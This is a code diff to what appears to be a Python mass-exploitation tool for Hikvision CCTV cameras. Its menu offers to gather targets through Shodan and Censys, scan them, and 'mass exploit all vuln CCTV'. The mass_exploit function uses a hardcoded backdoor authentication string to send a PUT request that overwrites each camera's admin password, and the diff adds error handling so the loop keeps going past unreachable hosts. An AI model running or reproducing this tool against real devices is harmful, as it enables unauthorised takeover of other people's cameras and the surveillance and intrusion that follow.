@@ -27,26 +27,26 @@ up_host = open(path + '/up_host.txt', 'r').read().splitlines()
 vulnerable_host = open(path + '/vuln_host.txt', 'r').read().splitlines()
 BackdoorAuthArg = "auth=YWRtaW46MTEK"
 def usage():
-    print (""" ____  ____   _   __                       __           _   _    
-|_   ||   _| (_) [  |  _                  [  |         (_) / |_  
-  | |__| |   __   | | / ]  _   __  _ .--.  | |  .--.   __ `| |-' 
-  |  __  |  [  |  | '' <  [ \ [  ][ '/'`\ \| |/ .'`\ \[  | | |   
- _| |  | |_  | |  | |`\ \  > '  <  | \__/ || || \__. | | | | |,  
-|____||____|[___][__|  \_][__]`\_] | ;.__/[___]'.__.' [___]\__/  
-                                  [__|                           """)
-    print ("""+------------------------------------------------------------+
-|     exploit all the vulnerable cctv from hikvision         |
-|------------------------------------------------------------|
-| Usage:                                                     |
-| 1. Gather host with shodan (api needed)                    |
-| 2. Gather host with censys.io (api needed)                 |
-| 3. scan for up host                                        |
-| 4. scan for vuln host                                      |
-| 5. mass exploit all vuln CCTV                              |
-| 6. select a CCTV'S ip to exploit                           |
-| 7. random exploit CCTV from the vuln list                  |
-| 8. install dependency                                      |
-+------------------------------------------------------------+""")
+    print ("""               ____  ____   _   __                       __           _   _    
+              |_   ||   _| (_) [  |  _                  [  |         (_) / |_  
+                | |__| |   __   | | / ]  _   __  _ .--.  | |  .--.   __ `| |-' 
+                |  __  |  [  |  | '' <  [ \ [  ][ '/'`\ \| |/ .'`\ \[  | | |   
+               _| |  | |_  | |  | |`\ \  > '  <  | \__/ || || \__. | | | | |,  
+              |____||____|[___][__|  \_][__]`\_] | ;.__/[___]'.__.' [___]\__/  
+                                                 [__|                           """)
+    print ("""              +------------------------------------------------------------+
+              |     exploit all the vulnerable cctv from hikvision         |
+              |------------------------------------------------------------|
+              | Usage:                                                     |
+              | 1. Gather host with shodan (api needed)                    |
+              | 2. Gather host with censys.io (api needed)                 |
+              | 3. scan for up host                                        |
+              | 4. scan for vuln host                                      |
+              | 5. mass exploit all vuln CCTV                              |
+              | 6. select a CCTV'S ip to exploit                           |
+              | 7. random exploit CCTV from the vuln list                  |
+              | 8. install dependency                                      |
+              +------------------------------------------------------------+""")
                                                                 
 def gather_host_shodan():
     api_shodan_key = open(path + "/api.txt","r").read()
@@ -106,20 +106,23 @@ def mass_exploit():
     pattern_2 = r'(\:).*'
     a = 0
     while a < len(vulnerable_host):
-        res = vulnerable_host[a]
-        print res
-        match1 = re.search(pattern_1, res)
-        match2 = re.search(pattern_2, res)
-        target_host = match1.group()
-        port_raw = match2.group()
-        port = port_raw[1:]
-        newPass = "12345admin"
-        userID = "1"
-        userName = "admin"
-        userXML = '<User version="1.0" xmlns="http://www.hikvision.com/ver10/XMLSchema">''.<id>'+ userID + '</id>.<userName>'+ userName + '</userName>.<password>'+ newPass + '</password>.</User>'
-        URLBase = "http://"+target_host+ ":" + str(port) + "/"
-        URLUpload = URLBase + "Security/users/1?" + BackdoorAuthArg
-        x = requests.put(URLUpload, data=userXML).text
+        try:
+            res = vulnerable_host[a]
+            print res
+            match1 = re.search(pattern_1, res)
+            match2 = re.search(pattern_2, res)
+            target_host = match1.group()
+            port_raw = match2.group()
+            port = port_raw[1:]
+            newPass = "12345porcodio"
+            userID = "1"
+            userName = "admin"
+            userXML = '<User version="1.0" xmlns="http://www.hikvision.com/ver10/XMLSchema">''.<id>'+ userID + '</id>.<userName>'+ userName + '</userName>.<password>'+ newPass + '</password>.</User>'
+            URLBase = "http://"+target_host+ ":" + str(port) + "/"
+            URLUpload = URLBase + "Security/users/1?" + BackdoorAuthArg
+            x = requests.put(URLUpload, data=userXML).text
+        except requests.exceptions.ConnectionError:
+            pass
         a += 1
 def select_host_exploit():
     global target_host
@@ -333,12 +336,12 @@ def response():
         install_dependence()
     elif str(usage_str) == "help":
         main()
-        
-    
 
 
 
-    
+
+
+
 def main():
     try:
         usage()
